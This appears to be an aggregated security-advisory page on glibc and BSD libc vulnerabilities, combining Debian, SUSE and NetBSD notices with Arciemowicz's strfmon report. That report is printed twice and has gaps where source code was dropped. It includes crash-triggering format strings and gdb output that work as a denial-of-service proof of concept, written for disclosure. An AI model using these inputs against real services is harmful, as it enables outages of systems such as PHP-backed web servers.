                 CVE-2010-0296 CVE-2010-0830
Debian Bug     : 583908

Several vulnerabilities have been discovered in the GNU C Library (aka
glibc) and its derivatives. The Common Vulnerabilities and Exposures
project identifies the following problems:

CVE-2008-1391, CVE-2009-4880, CVE-2009-4881

Maksymilian Arciemowicz discovered that the GNU C library did not
correctly handle integer overflows in the strfmon family of
functions. If a user or automated system were tricked into
processing a specially crafted format string, a remote attacker
could crash applications, leading to a denial of service.

CVE-2010-0296

Jeff Layton and Dan Rosenberg discovered that the GNU C library did
not correctly handle newlines in the mntent family of functions. If
a local attacker were able to inject newlines into a mount entry
through other vulnerable mount helpers, they could disrupt the
system or possibly gain root privileges.

CVE-2010-0830

Dan Rosenberg discovered that the GNU C library did not correctly
validate certain ELF program headers.  If a user or automated system
were tricked into verifying a specially crafted ELF program, a
remote attacker could execute arbitrary code with user privileges.

For the stable distribution (lenny), these problems have been fixed in
version 2.7-18lenny4 of the glibc package.

For the testing distribution (squeeze), these problems will be fixed soon.

For the unstable distribution (sid), these problems has been fixed in
version 2.1.11-1 of the eglibc package.

We recommend that you upgrade your glibc or eglibc packages.

[ \*BSD libc (strfmon) Multiple vulnerabilities ]
Author: Maksymilian Arciemowicz
Date:
- - Written: 10.03.2008
- - Public: 25.03.2008
CVE: CVE-2008-1391
Risk: High
Affected Software:
FreeBSD lines: 6,7
NetBSD 4
another systems what use this functions.
Standard C Library (libc, -lc) for BSD
probably some MacOS version
Vendor: http://www.php.net
- --- 0.Description ---
strfmon -- convert monetary value to string
The strfmon() function places characters into the array pointed to by s as controlled by the string pointed to by format. No more than maxsize bytes are placed into the array.
The format string is composed of zero or more directives: ordinary characters (not %), which are copied unchanged to the output stream; and conversion specifications, each of which results in fetching zero or more subsequent arguments. Each conversion specification is introduced by the % character.
SYNOPSIS:
#include <monetary.h>
ssize\_t
strfmon(char \* restrict s, size\_t maxsize, const char \* restrict format,
...);
- --- 1. /usr/src/lib/libc/stdlib/strfmon.c - Integer Overflow ---
The main problem and vulnerability exist in strfmon() function. When we use this function in example program:
- ---example-start--
#include <stdio.h>
#include <monetary.h>
int main(int argc, char\* argv[]){
char buff[51];
char \*bux=buff;
int res;
res=strfmon(bux, 50, argv[1], "0");
return 0;
}
- ---example-end--
and compile it, we can manipulate format string.
Let's try to run example:
cxib# ./pln %99999999999999999999n
Segmentation fault (core dumped)
What is wrong? Let's see
cxib# gdb -q pln
(no debugging symbols found)...(gdb) r %99999999999999999999n
Starting program: /cxib/C/pln %99999999999999999999n
(no debugging symbols found)...(no debugging symbols found)...
Program received signal SIGSEGV, Segmentation fault.
0x2814e0e6 in memmove () from /lib/libc.so.7
(gdb)
memmove() will bad reallocation memory.
cxib# gdb -q pln
(no debugging symbols found)...(gdb) r %.9999999999n
Starting program: /cxib/C/pln %.9999999999n
(no debugging symbols found)...(no debugging symbols found)...
Program received signal SIGSEGV, Segmentation fault.
0x2814f093 in abort () from /lib/libc.so.7
Next example is :
cxib# ./pln %#99999999999999999999n
Long execution time. Let's try check this process :
- --------------------------
cxib# ps -aux | grep pln
cxib 1843 89.1 13.2 140320 119588 p2 R+ 4:29PM 0:09.68 ./pln %#99999999999999999999n
cxib# ps -aux | grep pln
cxib 1843 94.7 48.4 482336 438236 p2 R+ 4:29PM 1:54.07 ./pln %#99999999999999999999n
1 VSZ=140320
2 VSZ=482336
- ----------------------------
Why? pln will allocate more memory that we have. PHP use strfmon() in money\_format() function. When we use mod\_php5 in apache, we can create example exploit.. result will be :
- ---apache-child-die---
swap\_pager: out of swap space
swap\_pager\_getswapspace(16): failed
Mar 15 21:03:23 cxib kernel: pid 1210 (httpd), uid 80, was killed: out of swap space
- ---apache-child-die---
Difference between %99999999999999999999n and (%#99999999999999999999n or %.9999999999n) is "#" or "."
o A `#' sign followed by a decimal number specifying the maximum
expected number of digits after the radix character.
o A `.' character followed by a decimal number specifying the number
the number of digits after the radix character.
Let's see the source of strfmon() function :

As we can see locks are corrected, but function GET\_NUMBER()
- ---GET\_NUMBER()-start---
#define GET\_NUMBER(VAR) do { \
VAR = 0; \
while (isdigit((unsigned char)\*fmt)) { \
VAR \*= 10; \
VAR += \*fmt - '0'; \
fmt++; \
} \
} while (0)
- ---GET\_NUMBER()-end---
fmt=2147483647n => GET\_NUMBER(2147483647)
fmt=2147483648n => GET\_NUMBER(-2147483648)
fmt=2147483649n => GET\_NUMBER(-2147483647)
fmt=4294967296n => GET\_NUMBER(0)
fmt=4294967297n => GET\_NUMBER(1)
We have integer overflow.
Next problem is with int left\_prec and right\_prec. Sum of this int's isn't checked.
Problem exist also in printf() function.
Example code will show Integer Overflow .
- ---example-start--
#include <stdio.h>
int
main(int argc, char \*argv[])
{
printf("%1410065408.1410065407f\n", 2);
return 0;
}
- ---example-end--
cxib# gcc -o pln pln.c && ./pln
Segmentation fault (core dumped)
What is wrong? the same problem that was in strfmon() function.
- ---
/\* convert to string \*/
snprintf(fmt, sizeof(fmt), "%%%d.%df", left\_prec + right\_prec + 1,
right\_prec);
avalue\_size = asprintf(&avalue, fmt, value);
- ---
fmt is here 32 chars table. So for format like
strfmon(bux, 50, "%.10n", "1.1");
fmt will have %11.10f
for
res=strfmon(bux, 50, "%.1410065407n", "1.1");
will be crash here
avalue\_size = asprintf(&avalue, fmt, value);
fmt=%1410065408.1410065407f
value=1.1
it is possible? asprintf(&avalue, "%.1410065407f", "1.1");
and the question is why? Let's see to gdb
cxib# gdb -q pln
(no debugging symbols found)...(gdb) r
Starting program: /cxib/C/pln
(no debugging symbols found)...(no debugging symbols found)...
Program received signal SIGSEGV, Segmentation fault.
0x2814f0a3 in abort () from /lib/libc.so.7
SecurityReason will only alarm all BSDs developers to check libc. A lot of programs (with strfmon function) should be recompiled after libc updated. We have informed NetBSD and FreeBSD teams, but we don't know how exactly use this functions. The priority of strfmon() issues are very High.
- --- 2. Exploit ---
N/A
- --- 3. How to fix ---
We have informed NetBSD teams about it. strfmon() function is fixed in
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/stdlib/strfmon.c
but we are not sure of it is correct.

Fix various bugs with strfmon:
- Avoid out of bounds access for the currency_symbol[3] when the symbol
  is shorter (as it happens with the C locale where it is empty)
- Don't compare pointers to NUL, it is not helpful.
- Make the default sep_by_space 1 as suggested in:
      <https://ftp.gnu.org/old-gnu/Manuals/glibc-2.2.3/html_node/libc_111.html>
- Use the correct number of bytes for [memmove(3)](http://man.NetBSD.org/memmove.3)

PR/[45989](http://gnats.NetBSD.org/45989): Martin Husemann: lint invocation does include -w only on i386

- turn lint -w for all the platforms after fixing the lint warnings.
- add _DIAGASSERTS() for casts that would assign values to types that
  would not fit.
- change types, add casts
- change into ansii prototypes
- turn on _DIAGNOSTIC for libc (during current, to be eliminated for release
  builds)

1) Problem Description and Brief Discussion
The Linux C library glibc was updated to fix critical security issues and several bugs:
CVE-2010-3847: Decoding of the $ORIGIN special value in various LD\_
environment variables allowed local attackers to execute code in
context of e.g. setuid root programs, elevating privileges.
This specific issue did not affect SUSE as an assertion triggers
before the respective code is executed. The bug was fixed by this
update nevertheless.
CVE-2010-3856: The LD\_AUDIT environment was not pruned during setuid
root execution and could load shared libraries from standard system
library paths.
This could be used by local attackers to inject code into setuid root
programs and so elevated privileges.
Both of these were found by Tavis Ormandy and we thank him for finding
and reporting those issues.
SUSE Linux Enterprise Server 9 is not affected by the above problems,
as its glibc does neither support LD\_AUDIT nor the $ORIGIN expansion
required by the first problem.
On openSUSE 11.1, 11.2 and SUSE Linux Enterprise 10 Service Pack 3
and SUSE Linux Enterprise 11 GA also the following minor security
issues were fixed:
CVE-2010-0830: Integer overflow causing arbitrary code execution
in ld.so --verify mode could be induced by a specially crafted
binary. This would require running the code on untrusted code which
we did not consider likely.
We thank Dan Rosenberg for reporting this problem.
CVE-2010-0296: The addmntent() function would not escape the newline
character properly, allowing the user to insert arbitrary newlines
to the /etc/mtab; if the addmntent() is run by a setuid mount binary
that does not do extra input check, this would allow custom entries
to be inserted in /etc/mtab.
We thank Dan Rosenberg and Jeff Layton for reporting this problem.
CVE-2008-1391: The strfmon() function contains an integer overflow
vulnerability in width specifiers handling that could be triggered
by an attacker that can control the format string passed to strfmon().
We thank Maksymilian Arciemowicz for reporting this problem.
CVE-2010-0015: Some setups (mainly Solaris-based legacy setups)
include shadow information (password hashes) as so-called "adjunct
passwd" table, mangling it with the rest of passwd columns instead
of keeping it in the shadow table. Normally, Solaris will disclose
this information only to clients bound to a privileged port, but
when nscd is deployed on the client, getpwnam() would disclose the
password hashes to all users. New mode "adjunct as shadow" can now
be enabled in /etc/default/nss that will move the password hashes
from the world-readable passwd table to emulated shadow table (that
is not cached by nscd).
We thank Christoph Pleger for reporting this problem.
2) Solution or Work-Around
There is no known workaround, please install the update packages.
3) Special Instructions and Notes
A reboot is not required to activate this change.
However as old processes will still be using the old C library, a reboot
is at least recommended.
4) Package Location and Checksums
The preferred method for installing security updates is to use the YaST
"Online Update" module or the "zypper" commandline tool. The package and
patch management stack will detect which updates are required and
automatically perform the necessary steps to verify and install them.
Alternatively, download the update packages for your distribution manually
and verify their integrity by the methods listed in Section 6 of this
announcement. Then install the packages using the command
rpm -Fhv <file.rpm>
to apply the update, replacing <file.rpm> with the filename of the
downloaded RPM package.

6) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file where you saved the
announcement. The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and the integrity of
a package needs to be verified to ensure that it has not been tampered
with.
The internal rpm package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on
RPMv4-based distributions) and the gpg key ring of 'root' during
installation. You can also find it on the first installation CD and at
the end of this announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.

[ \*BSD libc (strfmon) Multiple vulnerabilities ]
Author: Maksymilian Arciemowicz
Date:
- - Written: 10.03.2008
- - Public: 25.03.2008
CVE: CVE-2008-1391
Risk: High
Affected Software:
FreeBSD lines: 6,7
NetBSD 4
another systems what use this functions.
Standard C Library (libc, -lc) for BSD
probably some MacOS version
Vendor: http://www.php.net
- --- 0.Description ---
strfmon -- convert monetary value to string
The strfmon() function places characters into the array pointed to by s as controlled by the string pointed to by format. No more than maxsize bytes are placed into the array.
The format string is composed of zero or more directives: ordinary characters (not %), which are copied unchanged to the output stream; and conversion specifications, each of which results in fetching zero or more subsequent arguments. Each conversion specification is introduced by the % character.
SYNOPSIS:
#include <monetary.h>
ssize\_t
strfmon(char \* restrict s, size\_t maxsize, const char \* restrict format,
...);
- --- 1. /usr/src/lib/libc/stdlib/strfmon.c - Integer Overflow ---
The main problem and vulnerability exist in strfmon() function. When we use this function in example program:
- ---example-start--
#include <stdio.h>
#include <monetary.h>
int main(int argc, char\* argv[]){
char buff[51];
char \*bux=buff;
int res;
res=strfmon(bux, 50, argv[1], "0");
return 0;
}
- ---example-end--
and compile it, we can manipulate format string.
Let's try to run example:
cxib# ./pln %99999999999999999999n
Segmentation fault (core dumped)
What is wrong? Let's see
cxib# gdb -q pln
(no debugging symbols found)...(gdb) r %99999999999999999999n
Starting program: /cxib/C/pln %99999999999999999999n
(no debugging symbols found)...(no debugging symbols found)...
Program received signal SIGSEGV, Segmentation fault.
0x2814e0e6 in memmove () from /lib/libc.so.7
(gdb)
memmove() will bad reallocation memory.
cxib# gdb -q pln
(no debugging symbols found)...(gdb) r %.9999999999n
Starting program: /cxib/C/pln %.9999999999n
(no debugging symbols found)...(no debugging symbols found)...
Program received signal SIGSEGV, Segmentation fault.
0x2814f093 in abort () from /lib/libc.so.7
Next example is :
cxib# ./pln %#99999999999999999999n
Long execution time. Let's try check this process :
- --------------------------
cxib# ps -aux | grep pln
cxib 1843 89.1 13.2 140320 119588 p2 R+ 4:29PM 0:09.68 ./pln %#99999999999999999999n
cxib# ps -aux | grep pln
cxib 1843 94.7 48.4 482336 438236 p2 R+ 4:29PM 1:54.07 ./pln %#99999999999999999999n
1 VSZ=140320
2 VSZ=482336
- ----------------------------
Why? pln will allocate more memory that we have. PHP use strfmon() in money\_format() function. When we use mod\_php5 in apache, we can create example exploit.. result will be :
- ---apache-child-die---
swap\_pager: out of swap space
swap\_pager\_getswapspace(16): failed
Mar 15 21:03:23 cxib kernel: pid 1210 (httpd), uid 80, was killed: out of swap space
- ---apache-child-die---
Difference between %99999999999999999999n and (%#99999999999999999999n or %.9999999999n) is "#" or "."
o A `#' sign followed by a decimal number specifying the maximum
expected number of digits after the radix character.
o A `.' character followed by a decimal number specifying the number
the number of digits after the radix character.
Let's see the source of strfmon() function :

fmt=2147483648n => GET\_NUMBER(-2147483648)
fmt=2147483649n => GET\_NUMBER(-2147483647)
fmt=4294967296n => GET\_NUMBER(0)
fmt=4294967297n => GET\_NUMBER(1)
We have integer overflow.
Next problem is with int left\_prec and right\_prec. Sum of this int's isn't checked.
Problem exist also in printf() function.
Example code will show Integer Overflow .
- ---example-start--
#include <stdio.h>
int
main(int argc, char \*argv[])
{
printf("%1410065408.1410065407f\n", 2);
return 0;
}
- ---example-end--
cxib# gcc -o pln pln.c && ./pln
Segmentation fault (core dumped)
What is wrong? the same problem that was in strfmon() function.
- ---
/\* convert to string \*/
snprintf(fmt, sizeof(fmt), "%%%d.%df", left\_prec + right\_prec + 1,
right\_prec);
avalue\_size = asprintf(&avalue, fmt, value);
- ---
fmt is here 32 chars table. So for format like
strfmon(bux, 50, "%.10n", "1.1");
fmt will have %11.10f
for
res=strfmon(bux, 50, "%.1410065407n", "1.1");
will be crash here
avalue\_size = asprintf(&avalue, fmt, value);
fmt=%1410065408.1410065407f
value=1.1
it is possible? asprintf(&avalue, "%.1410065407f", "1.1");
and the question is why? Let's see to gdb
cxib# gdb -q pln
(no debugging symbols found)...(gdb) r
Starting program: /cxib/C/pln
(no debugging symbols found)...(no debugging symbols found)...
Program received signal SIGSEGV, Segmentation fault.
0x2814f0a3 in abort () from /lib/libc.so.7
SecurityReason will only alarm all BSDs developers to check libc. A lot of programs (with strfmon function) should be recompiled after libc updated. We have informed NetBSD and FreeBSD teams, but we don't know how exactly use this functions. The priority of strfmon() issues are very High.
- --- 2. Exploit ---
N/A
- --- 3. How to fix ---
We have informed NetBSD teams about it. strfmon() function is fixed in
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/stdlib/strfmon.c
but we are not sure of it is correct.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
